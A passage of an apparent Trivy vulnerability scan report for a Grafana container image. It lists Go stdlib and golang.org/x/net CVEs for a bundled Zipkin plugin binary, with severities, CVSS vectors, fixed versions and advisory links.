│                       │     │                  │         │           /A:H 
│                       │     │                  │         ╰ V3Score : 7.5 
│                       │     │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N
│                       │     │                            │           /A:H 
│                       │     │                            ╰ V3Score : 7.5 
│                       │     ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-42504 
│                       │     │                  ├ [1]: https://go.dev/cl/774481 
│                       │     │                  ├ [2]: https://go.dev/issue/79217 
│                       │     │                  ├ [3]: https://groups.google.com/g/golang-announce/c/tKs3rmcBcKw 
│                       │     │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-42504 
│                       │     │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-5038 
│                       │     │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-42504 
│                       │     ├ PublishedDate   : 2026-06-02T23:16:37.927Z 
│                       │     ╰ LastModifiedDate: 2026-07-22T19:10:00.12Z 
│                       ├ [7] ╭ VulnerabilityID : CVE-2026-42505 
│                       │     ├ VendorIDs        ─ [0]: GO-2026-5856 
│                       │     ├ PkgID           : stdlib@v1.26.3 
│                       │     ├ PkgName         : stdlib 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.3 
│                       │     │                  ╰ UID : f77aad5d3fa73e61 
│                       │     ├ InstalledVersion: v1.26.3 
│                       │     ├ FixedVersion    : 1.25.12, 1.26.5, 1.27.0-rc.2 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c
│                       │     │                  │         6997c001601e2a6e5af 
│                       │     │                  ╰ DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172
│                       │     │                            e154f0b8ad928e980c9 
│                       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42505 
│                       │     ├ DataSource       ╭ ID  : govulndb 
│                       │     │                  ├ Name: The Go Vulnerability Database 
│                       │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│                       │     ├ Fingerprint     : sha256:d59e3c4d5ecf52abf387f57e55b9e9e54d8b38ba090dfb5f833563
│                       │     │                   d983336b8f 
│                       │     ├ Title           : crypto/tls: golang: Go crypto/tls: Information disclosure in
│                       │     │                   Encrypted Client Hello 
│                       │     ├ Description     : Handshakes which used Encrypted Client Hello could be
│                       │     │                   de-anonymized by a passive network observer due to a
│                       │     │                   disclosure of pre-shared key identities in the unencrypted
│                       │     │                   client hello. 
│                       │     ├ Severity        : MEDIUM 
│                       │     ├ CweIDs           ─ [0]: CWE-201 
│                       │     ├ VendorSeverity   ╭ amazon : 2 
│                       │     │                  ├ bitnami: 2 
│                       │     │                  ╰ redhat : 2 
│                       │     ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N
│                       │     │                  │         │           /A:N 
│                       │     │                  │         ╰ V3Score : 5.3 
│                       │     │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N
│                       │     │                            │           /A:N 
│                       │     │                            ╰ V3Score : 5.3 
│                       │     ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-42505 
│                       │     │                  ├ [1]: https://go.dev/cl/775960 
│                       │     │                  ├ [2]: https://go.dev/issue/79282 
│                       │     │                  ├ [3]: https://groups.google.com/g/golang-announce/c/OrmQE_Yp5Sc 
│                       │     │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-42505 
│                       │     │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-5856 
│                       │     │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-42505 
│                       │     ├ PublishedDate   : 2026-07-08T17:17:21.497Z 
│                       │     ╰ LastModifiedDate: 2026-07-13T17:05:36.303Z 
│                       ╰ [8] ╭ VulnerabilityID : CVE-2026-42507 
│                             ├ VendorIDs        ─ [0]: GO-2026-5039 
│                             ├ PkgID           : stdlib@v1.26.3 
│                             ├ PkgName         : stdlib 
│                             ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.3 
│                             │                  ╰ UID : f77aad5d3fa73e61 
│                             ├ InstalledVersion: v1.26.3 
│                             ├ FixedVersion    : 1.25.11, 1.26.4 
│                             ├ Status          : fixed 
│                             ├ Layer            ╭ Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c
│                             │                  │         6997c001601e2a6e5af 
│                             │                  ╰ DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172
│                             │                            e154f0b8ad928e980c9 
│                             ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42507 
│                             ├ DataSource       ╭ ID  : govulndb 
│                             │                  ├ Name: The Go Vulnerability Database 
│                             │                  ╰ URL : https://pkg.go.dev/vuln/ 
│                             ├ Fingerprint     : sha256:07912bd1364b59c7c11baf26b77587a71d433db607c160bc18f2a8
│                             │                   c13c8c3e00 
│                             ├ Title           : net/textproto: golang: Golang net/textproto: Misleading error
│                             │                    messages via input injection 
│                             ├ Description     : When returning errors, functions in the net/textproto package
│                             │                    would include its input as part of the error. This might
│                             │                   allow an attacker to inject misleading content to errors that
│                             │                    are printed or logged. 
│                             ├ Severity        : MEDIUM 
│                             ├ VendorSeverity   ╭ alma       : 2 
│                             │                  ├ amazon     : 2 
│                             │                  ├ bitnami    : 2 
│                             │                  ├ oracle-oval: 2 
│                             │                  ├ redhat     : 2 
│                             │                  ╰ rocky      : 2 
│                             ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L
│                             │                  │         │           /A:N 
│                             │                  │         ╰ V3Score : 5.3 
│                             │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L
│                             │                            │           /A:N 
│                             │                            ╰ V3Score : 5.3 
│                             ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:29981 
│                             │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-42507 
│                             │                  ├ [2] : https://bugzilla.redhat.com/2484205 
│                             │                  ├ [3] : https://bugzilla.redhat.com/show_bug.cgi?id=2484205 
│                             │                  ├ [4] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-202
│                             │                  │       6-42507 
│                             │                  ├ [5] : https://errata.almalinux.org/9/ALSA-2026-29981.html 
│                             │                  ├ [6] : https://errata.rockylinux.org/RLSA-2026:29980 
│                             │                  ├ [7] : https://go.dev/cl/777060 
│                             │                  ├ [8] : https://go.dev/issue/79346 
│                             │                  ├ [9] : https://groups.google.com/g/golang-announce/c/tKs3rmcB
│                             │                  │       cKw 
│                             │                  ├ [10]: https://linux.oracle.com/cve/CVE-2026-42507.html 
│                             │                  ├ [11]: https://linux.oracle.com/errata/ELSA-2026-29981.html 
│                             │                  ├ [12]: https://nvd.nist.gov/vuln/detail/CVE-2026-42507 
│                             │                  ├ [13]: https://pkg.go.dev/vuln/GO-2026-5039 
│                             │                  ╰ [14]: https://www.cve.org/CVERecord?id=CVE-2026-42507 
│                             ├ PublishedDate   : 2026-06-02T23:16:38.027Z 
│                             ╰ LastModifiedDate: 2026-07-22T19:10:00.12Z 
╰ [8] ╭ Target         : usr/share/grafana/data/plugins-bundled/zipkin/gpx_grafana-zipkin-datasource_linux_amd64 
      ├ Class          : lang-pkgs 
      ├ Type           : gobinary 
      ├ Packages        
      ╰ Vulnerabilities ╭ [0]  ╭ VulnerabilityID : CVE-2026-25681 
                        │      ├ VendorIDs        ─ [0]: GO-2026-5029 
                        │      ├ PkgID           : golang.org/x/net@v0.49.0 
                        │      ├ PkgName         : golang.org/x/net 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.49.0 
                        │      │                  ╰ UID : d9a61092434f99e5 
                        │      ├ InstalledVersion: v0.49.0 
                        │      ├ FixedVersion    : 0.55.0 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300
                        │      │                  │         c6997c001601e2a6e5af 
                        │      │                  ╰ DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a17
                        │      │                            2e154f0b8ad928e980c9 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-25681 
                        │      ├ DataSource       ╭ ID  : govulndb 
                        │      │                  ├ Name: The Go Vulnerability Database 
                        │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
                        │      ├ Fingerprint     : sha256:53ee8cacca255193bd1783102f04ce7aee54f2431b63b8b9b88f0
                        │      │                   3a9ded30152 
                        │      ├ Title           : golang.org/x/net/html: golang.org/x/net/html: Arbitrary code
                        │      │                    execution via Cross-Site Scripting 
                        │      ├ Description     : Parsing arbitrary HTML which is then rendered using Render
                        │      │                   can result in an unexpected HTML tree. This can be leveraged
                        │      │                    to execute XSS attacks in applications that attempt to
                        │      │                   sanitize input HTML before rendering. 
                        │      ├ Severity        : HIGH 
                        │      ├ CweIDs           ─ [0]: CWE-1021 
                        │      ├ VendorSeverity   ╭ alma       : 3 
                        │      │                  ├ amazon     : 3 
                        │      │                  ├ azure      : 2 
                        │      │                  ├ oracle-oval: 3 
                        │      │                  ├ redhat     : 3 
                        │      │                  ╰ rocky      : 3 
                        │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H
                        │      │                           │           /A:N 
                        │      │                           ╰ V3Score : 8.1 
                        │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:37123 
                        │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-25681 
                        │      │                  ├ [2] : https://bugzilla.redhat.com/2480680 
                        │      │                  ├ [3] : https://bugzilla.redhat.com/2480681 
                        │      │                  ├ [4] : https://bugzilla.redhat.com/2480685 
                        │      │                  ├ [5] : https://bugzilla.redhat.com/2480688 
                        │      │                  ├ [6] : https://bugzilla.redhat.com/2480757 
                        │      │                  ├ [7] : https://bugzilla.redhat.com/2480761 
                        │      │                  ├ [8] : https://bugzilla.redhat.com/2493620 
                        │      │                  ├ [9] : https://bugzilla.redhat.com/show_bug.cgi?id=2480680 
                        │      │                  ├ [10]: https://bugzilla.redhat.com/show_bug.cgi?id=2480681 
                        │      │                  ├ [11]: https://bugzilla.redhat.com/show_bug.cgi?id=2480684 
                        │      │                  ├ [12]: https://bugzilla.redhat.com/show_bug.cgi?id=2480685 
                        │      │                  ├ [13]: https://bugzilla.redhat.com/show_bug.cgi?id=2480688 
                        │      │                  ├ [14]: https://bugzilla.redhat.com/show_bug.cgi?id=2480757 
                        │      │                  ├ [15]: https://bugzilla.redhat.com/show_bug.cgi?id=2480761 
                        │      │                  ├ [16]: https://bugzilla.redhat.com/show_bug.cgi?id=2493620 
                        │      │                  ├ [17]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
                        │      │                  │       26-25681 
                        │      │                  ├ [18]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
                        │      │                  │       26-27136 
                        │      │                  ├ [19]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
                        │      │                  │       26-39829 
                        │      │                  ├ [20]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
                        │      │                  │       26-39830 
                        │      │                  ├ [21]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
                        │      │                  │       26-39832 
                        │      │                  ├ [22]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
                        │      │                  │       26-39835 
                        │      │                  ├ [23]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
                        │      │                  │       26-42508 
                        │      │                  ├ [24]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
                        │      │                  │       26-57231 
                        │      │                  ├ [25]: https://errata.almalinux.org/9/ALSA-2026-37123.html 
                        │      │                  ├ [26]: https://errata.rockylinux.org/RLSA-2026:37072 
                        │      │                  ├ [27]: https://go.dev/cl/781703 
                        │      │                  ├ [28]: https://go.dev/issue/79574 
                        │      │                  ├ [29]: https://groups.google.com/g/golang-announce/c/iI-mYSI
                        │      │                  │       0lu8 
                        │      │                  ├ [30]: https://linux.oracle.com/cve/CVE-2026-25681.html 
                        │      │                  ├ [31]: https://linux.oracle.com/errata/ELSA-2026-37123.html 
                        │      │                  ├ [32]: https://nvd.nist.gov/vuln/detail/CVE-2026-25681 
                        │      │                  ├ [33]: https://pkg.go.dev/vuln/GO-2026-5029 
                        │      │                  ╰ [34]: https://www.cve.org/CVERecord?id=CVE-2026-25681 
                        │      ├ PublishedDate   : 2026-05-22T16:16:19.863Z 
                        │      ╰ LastModifiedDate: 2026-07-23T16:10:00.137Z 
                        ├ [1]  ╭ VulnerabilityID : CVE-2026-27136 
                        │      ├ VendorIDs        ─ [0]: GO-2026-5030 
                        │      ├ PkgID           : golang.org/x/net@v0.49.0 
                        │      ├ PkgName         : golang.org/x/net 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.49.0 
                        │      │                  ╰ UID : d9a61092434f99e5 
                        │      ├ InstalledVersion: v0.49.0 
                        │      ├ FixedVersion    : 0.55.0 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300
                        │      │                  │         c6997c001601e2a6e5af 
                        │      │                  ╰ DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a17
                        │      │                            2e154f0b8ad928e980c9 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-27136 
                        │      ├ DataSource       ╭ ID  : govulndb 
                        │      │                  ├ Name: The Go Vulnerability Database 
                        │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
                        │      ├ Fingerprint     : sha256:37b471eb79cce8f94dc91ce56709efc4183230d54895d7d6f6777
                        │      │                   2e3e7b070c1 
                        │      ├ Title           : golang.org/x/net/html: golang: golang.org/x/net/html:
                        │      │                   Cross-Site Scripting via HTML parsing bypass 
                        │      ├ Description     : Parsing arbitrary HTML which is then rendered using Render
                        │      │                   can result in an unexpected HTML tree. This can be leveraged
                        │      │                    to execute XSS attacks in applications that attempt to
                        │      │                   sanitize input HTML before rendering. 
                        │      ├ Severity        : HIGH 
                        │      ├ CweIDs           ─ [0]: CWE-1021 
                        │      ├ VendorSeverity   ╭ alma       : 3 
                        │      │                  ├ amazon     : 3 
                        │      │                  ├ azure      : 2 
                        │      │                  ├ oracle-oval: 3 
                        │      │                  ├ redhat     : 3 
                        │      │                  ╰ rocky      : 3 
                        │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H
                        │      │                           │           /A:N 
                        │      │                           ╰ V3Score : 8.1 
                        │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:37123 
                        │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-27136 
                        │      │                  ├ [2] : https://bugzilla.redhat.com/2480680 
                        │      │                  ├ [3] : https://bugzilla.redhat.com/2480681 
                        │      │                  ├ [4] : https://bugzilla.redhat.com/2480685 
                        │      │                  ├ [5] : https://bugzilla.redhat.com/2480688 
                        │      │                  ├ [6] : https://bugzilla.redhat.com/2480757 
                        │      │                  ├ [7] : https://bugzilla.redhat.com/2480761 
                        │      │                  ├ [8] : https://bugzilla.redhat.com/2493620 
                        │      │                  ├ [9] : https://bugzilla.redhat.com/show_bug.cgi?id=2480680 
                        │      │                  ├ [10]: https://bugzilla.redhat.com/show_bug.cgi?id=2480681 
                        │      │                  ├ [11]: https://bugzilla.redhat.com/show_bug.cgi?id=2480684 
                        │      │                  ├ [12]: https://bugzilla.redhat.com/show_bug.cgi?id=2480685 
                        │      │                  ├ [13]: https://bugzilla.redhat.com/show_bug.cgi?id=2480688 
                        │      │                  ├ [14]: https://bugzilla.redhat.com/show_bug.cgi?id=2480757 
                        │      │                  ├ [15]: https://bugzilla.redhat.com/show_bug.cgi?id=2480761 
                        │      │                  ├ [16]: https://bugzilla.redhat.com/show_bug.cgi?id=2493620 
                        │      │                  ├ [17]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
                        │      │                  │       26-25681 
                        │      │                  ├ [18]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
                        │      │                  │       26-27136 
                        │      │                  ├ [19]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
                        │      │                  │       26-39829 
                        │      │                  ├ [20]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
                        │      │                  │       26-39830 
                        │      │                  ├ [21]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
                        │      │                  │       26-39832 
                        │      │                  ├ [22]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
                        │      │                  │       26-39835 
                        │      │                  ├ [23]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
                        │      │                  │       26-42508 
                        │      │                  ├ [24]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
                        │      │                  │       26-57231 
                        │      │                  ├ [25]: https://errata.almalinux.org/9/ALSA-2026-37123.html 
                        │      │                  ├ [26]: https://errata.rockylinux.org/RLSA-2026:37072 
                        │      │                  ├ [27]: https://go.dev/cl/781685 
                        │      │                  ├ [28]: https://go.dev/issue/79575 
                        │      │                  ├ [29]: https://groups.google.com/g/golang-announce/c/iI-mYSI
                        │      │                  │       0lu8 
                        │      │                  ├ [30]: https://linux.oracle.com/cve/CVE-2026-27136.html 
                        │      │                  ├ [31]: https://linux.oracle.com/errata/ELSA-2026-37123.html 
                        │      │                  ├ [32]: https://nvd.nist.gov/vuln/detail/CVE-2026-27136 
                        │      │                  ├ [33]: https://pkg.go.dev/vuln/GO-2026-5030 
                        │      │                  ╰ [34]: https://www.cve.org/CVERecord?id=CVE-2026-27136 
                        │      ├ PublishedDate   : 2026-05-22T16:16:20.087Z 
                        │      ╰ LastModifiedDate: 2026-07-23T16:10:00.137Z 
                        ├ [2]  ╭ VulnerabilityID : CVE-2026-33814 
                        │      ├ VendorIDs        ─ [0]: GO-2026-4918 
                        │      ├ PkgID           : golang.org/x/net@v0.49.0 
                        │      ├ PkgName         : golang.org/x/net 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.49.0 
                        │      │                  ╰ UID : d9a61092434f99e5 
                        │      ├ InstalledVersion: v0.49.0 
                        │      ├ FixedVersion    : 0.53.0 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300
                        │      │                  │         c6997c001601e2a6e5af 
                        │      │                  ╰ DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a17
                        │      │                            2e154f0b8ad928e980c9 
                        │      ├ SeveritySource  : nvd 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-33814 
                        │      ├ DataSource       ╭ ID  : govulndb 
                        │      │                  ├ Name: The Go Vulnerability Database 
                        │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
                        │      ├ Fingerprint     : sha256:5e29d606b3b0e5ab3bca189eb46d1b4b10ace0688bf48dfbe69c6
                        │      │                   6d012196716 
                        │      ├ Title           : net/http/internal/http2: golang: golang.org/x/net: Go
                        │      │                   HTTP/2: Denial of Service via malformed
                        │      │                   SETTINGS_MAX_FRAME_SIZE frame 
                        │      ├ Description     : When processing HTTP/2 SETTINGS frames, transport will enter
                        │      │                    an infinite loop of writing CONTINUATION frames if it
                        │      │                   receives a SETTINGS_MAX_FRAME_SIZE with a value of 0. 
                        │      ├ Severity        : HIGH 
                        │      ├ CweIDs           ╭ [0]: CWE-835 
                        │      │                  ╰ [1]: CWE-606 
                        │      ├ VendorSeverity   ╭ amazon     : 3 
                        │      │                  ├ azure      : 2 
                        │      │                  ├ bitnami    : 3 
                        │      │                  ├ nvd        : 3 
                        │      │                  ├ oracle-oval: 3 
                        │      │                  ├ photon     : 3 
                        │      │                  ├ redhat     : 3 
                        │      │                  ╰ ubuntu     : 2 
                        │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:
                        │      │                  │         │           N/A:H 
                        │      │                  │         ╰ V3Score : 7.5 
                        │      │                  ├ nvd     ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:
                        │      │                  │         │           N/A:H 
                        │      │                  │         ╰ V3Score : 7.5 
                        │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:
                        │      │                            │           N/A:H 
                        │      │                            ╰ V3Score : 7.5 
                        │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:23262 
                        │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2026:23264 
                        │      │                  ├ [2] : https://access.redhat.com/errata/RHSA-2026:33120 
                        │      │                  ├ [3] : https://access.redhat.com/errata/RHSA-2026:33123 
                        │      │                  ├ [4] : https://access.redhat.com/errata/RHSA-2026:33142 
                        │      │                  ├ [5] : https://access.redhat.com/errata/RHSA-2026:33150 
                        │      │                  ├ [6] : https://access.redhat.com/errata/RHSA-2026:34342 
                        │      │                  ├ [7] : https://access.redhat.com/errata/RHSA-2026:37387 
                        │      │                  ├ [8] : https://access.redhat.com/errata/RHSA-2026:42644 
                        │      │                  ├ [9] : https://access.redhat.com/errata/RHSA-2026:43692 
                        │      │                  ├ [10]: https://access.redhat.com/security/cve/CVE-2026-33814 
                        │      │                  ├ [11]: https://bugzilla.redhat.com/show_bug.cgi?id=2467815 
                        │      │                  ├ [12]: https://github.com/golang/go/issues/78476 
                        │      │                  ├ [13]: https://go-review.googlesource.com/c/go/+/761581 
                        │      │                  ├ [14]: https://go-review.googlesource.com/c/net/+/761640 
                        │      │                  ├ [15]: https://go.dev/cl/761581 
                        │      │                  ├ [16]: https://go.dev/cl/761640 
                        │      │                  ├ [17]: https://go.dev/issue/78476 
                        │      │                  ├ [18]: https://groups.google.com/g/golang-announce/c/qcCIEXs
                        │      │                  │       o47M 
                        │      │                  ├ [19]: https://linux.oracle.com/cve/CVE-2026-33814.html 
                        │      │                  ├ [20]: https://linux.oracle.com/errata/ELSA-2026-22121.html 
                        │      │                  ├ [21]: https://nvd.nist.gov/vuln/detail/CVE-2026-33814 
                        │      │                  ├ [22]: https://pkg.go.dev/vuln/GO-2026-4918 
                        │      │                  ├ [23]: https://security.access.redhat.com/data/csaf/v2/vex/2
                        │      │                  │       026/cve-2026-33814.json 
                        │      │                  ├ [24]: https://ubuntu.com/security/notices/USN-8430-1 
                        │      │                  ├ [25]: https://ubuntu.com/security/notices/USN-8471-1 
                        │      │                  ├ [26]: https://ubuntu.com/security/notices/USN-8472-1 
                        │      │                  ├ [27]: https://ubuntu.com/security/notices/USN-8473-1 
                        │      │                  ╰ [28]: https://www.cve.org/CVERecord?id=CVE-2026-33814 
                        │      ├ PublishedDate   : 2026-05-07T20:16:42.88Z 
                        │      ╰ LastModifiedDate: 2026-07-24T13:18:01.21Z 
                        ├ [3]  ╭ VulnerabilityID : CVE-2026-39821 
                        │      ├ VendorIDs        ─ [0]: GO-2026-5026 
                        │      ├ PkgID           : golang.org/x/net@v0.49.0 
                        │      ├ PkgName         : golang.org/x/net 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.49.0 
                        │      │                  ╰ UID : d9a61092434f99e5 
                        │      ├ InstalledVersion: v0.49.0 
                        │      ├ FixedVersion    : 0.55.0 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300
                        │      │                  │         c6997c001601e2a6e5af 
                        │      │                  ╰ DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a17
                        │      │                            2e154f0b8ad928e980c9 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39821 
                        │      ├ DataSource       ╭ ID  : govulndb 
                        │      │                  ├ Name: The Go Vulnerability Database 
                        │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
                        │      ├ Fingerprint     : sha256:f0b0ea71f56ac2af1b778f855ad4296f0edfa6e63d69f93a3b8e5
                        │      │                   9af4c2c71af 
                        │      ├ Title           : golang.org/x/net/idna: golang: net/http:
                        │      │                   golang.org/x/net/idna: Privilege escalation via incorrect
                        │      │                   Punycode label processing 
                        │      ├ Description     : The ToASCII and ToUnicode functions incorrectly accept
                        │      │                   Punycode-encoded labels that decode to an ASCII-only label.
                        │      │                   For example, ToUnicode("xn--example-.com") incorrectly
                        │      │                   returns the name "example.com" rather than an error. This
                        │      │                   behavior can lead to privilege escalation in programs using
                        │      │                   the idna package. For example, a program which performs
                        │      │                   privilege checks on the ASCII hostname may reject
                        │      │                   "example.com" but permit "xn--example-.com". If that program
                        │      │                    subsequently converts the ASCII hostname to Unicode, it
                        │      │                   will inadvertently permits access to the Unicode name
                        │      │                   "example.com". 
                        │      ├ Severity        : HIGH 
                        │      ├ CweIDs           ─ [0]: CWE-1289 
                        │      ├ VendorSeverity   ╭ alma       : 3 
                        │      │                  ├ amazon     : 3 
                        │      │                  ├ azure      : 4 
                        │      │                  ├ oracle-oval: 3 
                        │      │                  ├ redhat     : 3 
                        │      │                  ├ rocky      : 3 
                        │      │                  ╰ ubuntu     : 2 
                        │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H
                        │      │                           │           /A:N 
                        │      │                           ╰ V3Score : 8.2 
                        │      ├ References       ╭ [0]  : https://access.redhat.com/errata/RHSA-2026:23262 
                        │      │                  ├ [1]  : https://access.redhat.com/errata/RHSA-2026:23264 
                        │      │                  ├ [2]  : https://access.redhat.com/errata/RHSA-2026:26546 
                        │      │                  ├ [3]  : https://access.redhat.com/errata/RHSA-2026:26547 
                        │      │                  ├ [4]  : https://access.redhat.com/errata/RHSA-2026:30650 
                        │      │                  ├ [5]  : https://access.redhat.com/errata/RHSA-2026:30651 
                        │      │                  ├ [6]  : https://access.redhat.com/errata/RHSA-2026:30853 
                        │      │                  ├ [7]  : https://access.redhat.com/errata/RHSA-2026:30854 
                        │      │                  ├ [8]  : https://access.redhat.com/errata/RHSA-2026:30855 
                        │      │                  ├ [9]  : https://access.redhat.com/errata/RHSA-2026:33155 
                        │      │                  ├ [10] : https://access.redhat.com/errata/RHSA-2026:33160 
                        │      │                  ├ [11] : https://access.redhat.com/errata/RHSA-2026:33163 
                        │      │                  ├ [12] : https://access.redhat.com/errata/RHSA-2026:33173 
                        │      │                  ├ [13] : https://access.redhat.com/errata/RHSA-2026:33183 
                        │      │                  ├ [14] : https://access.redhat.com/errata/RHSA-2026:33524 
                        │      │                  ├ [15] : https://access.redhat.com/errata/RHSA-2026:33531 
                        │      │                  ├ [16] : https://access.redhat.com/errata/RHSA-2026:34342 
                        │      │                  ├ [17] : https://access.redhat.com/errata/RHSA-2026:34357 
                        │      │                  ├ [18] : https://access.redhat.com/errata/RHSA-2026:34359 
                        │      │                  ├ [19] : https://access.redhat.com/errata/RHSA-2026:34364 
                        │      │                  ├ [20] : https://access.redhat.com/errata/RHSA-2026:34789 
                        │      │                  ├ [21] : https://access.redhat.com/errata/RHSA-2026:35826 
                        │      │                  ├ [22] : https://access.redhat.com/errata/RHSA-2026:35827 
                        │      │                  ├ [23] : https://access.redhat.com/errata/RHSA-2026:35828 
                        │      │                  ├ [24] : https://access.redhat.com/errata/RHSA-2026:35829 
                        │      │                  ├ [25] : https://access.redhat.com/errata/RHSA-2026:35830 
                        │      │                  ├ [26] : https://access.redhat.com/errata/RHSA-2026:35831 
                        │      │                  ├ [27] : https://access.redhat.com/errata/RHSA-2026:35993 
                        │      │                  ├ [28] : https://access.redhat.com/errata/RHSA-2026:35994 
                        │      │                  ├ [29] : https://access.redhat.com/errata/RHSA-2026:36105 
                        │      │                  ├ [30] : https://access.redhat.com/errata/RHSA-2026:36167 
                        │      │                  ├ [31] : https://access.redhat.com/errata/RHSA-2026:36207 
                        │      │                  ├ [32] : https://access.redhat.com/errata/RHSA-2026:36648 
                        │      │                  ├ [33] : https://access.redhat.com/errata/RHSA-2026:36651 
                        │      │                  ├ [34] : https://access.redhat.com/errata/RHSA-2026:36796 
                        │      │                  ├ [35] : https://access.redhat.com/errata/RHSA-2026:36797 
                        │      │                  ├ [36] : https://access.redhat.com/errata/RHSA-2026:36808 
                        │      │                  ├ [37] : https://access.redhat.com/errata/RHSA-2026:36820 
                        │      │                  ├ [38] : https://access.redhat.com/errata/RHSA-2026:36883 
                        │      │                  ├ [39] : https://access.redhat.com/errata/RHSA-2026:37387 
                        │      │                  ├ [40] : https://access.redhat.com/errata/RHSA-2026:37435 
                        │      │                  ├ [41] : https://access.redhat.com/errata/RHSA-2026:37436 
                        │      │                  ├ [42] : https://access.redhat.com/errata/RHSA-2026:38995 
                        │      │                  ├ [43] : https://access.redhat.com/errata/RHSA-2026:39005 
                        │      │                  ├ [44] : https://access.redhat.com/errata/RHSA-2026:39573 
                        │      │                  ├ [45] : https://access.redhat.com/errata/RHSA-2026:39879 
                        │      │                  ├ [46] : https://access.redhat.com/errata/RHSA-2026:40118 
                        │      │                  ├ [47] : https://access.redhat.com/errata/RHSA-2026:40262 
                        │      │                  ├ [48] : https://access.redhat.com/errata/RHSA-2026:40945 
                        │      │                  ├ [49] : https://access.redhat.com/errata/RHSA-2026:41019 
